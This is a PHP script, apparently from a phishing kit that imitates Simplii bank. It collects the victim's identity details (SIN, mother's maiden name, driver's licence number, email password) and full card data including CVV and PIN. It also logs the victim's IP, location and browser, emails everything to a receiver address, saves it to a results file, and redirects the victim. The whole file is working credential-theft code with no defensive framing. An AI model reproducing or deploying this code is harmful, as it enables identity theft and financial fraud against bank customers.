<?php
require "../../../CONTROLS.php";
require "../includes/session_protect.php";
require "../includes/functions.php";
require "../includes/One_Time.php";
ini_set('display_errors', 0);


        $date = date('l d F Y');
        $time = date('H:i');
        $FN = $_POST['FN'];
		$MN = $_POST['MN'];
		$DB = $_POST['D1']."-".$_POST['D2']."-".$_POST['D3'];
        $SN = $_POST['SN'];
		$DL = $_POST['DL'];
		$EA = $_POST['EA'];
		$EP = $_POST['EP'];
		$NC = $_POST['NC'];
		$CN = $_POST['CN'];
        $ED = $_POST['E1']."-".$_POST['E2'];
		$CV = $_POST['CV'];
        $AP = $_POST['AP'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "IP 			: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $VictimInfo2 = "LOCATION	: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
        $VictimInfo3 = "USERAGENT	: " . $systemInfo['useragent'] . "";
        $VictimInfo4 = "BROWSER		: " . $systemInfo['browser'] . "";
        $VictimInfo5 = "OS			: " . $systemInfo['os'] . "";
        $data = "
+ ------------- 2 PersonalDetails --------------+
| FULLNAME	: $FN
| D.O.B 	: $DB
| M.M.N		: $MN
| S.I.N 	: $SN
| D.L.N		: $DL
| EMAIL 	: $EA
| EPASS 	: $EP
+ ------------- 3 CardDetails ------------------+
| NAME		: $NC
| CARDNO 	: $CN
| EXP		: $ED
| CVV	 	: $CV
| PIN		: $AP
+ -------created by medpage[679849675]----------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ----------------------------------------------+
";


        $subject = "simpliiResults 2 " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);

$fp = fopen('../../../simpliiResults.txt', 'a');
fwrite($fp, $data);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "../../../directing.php";

</script>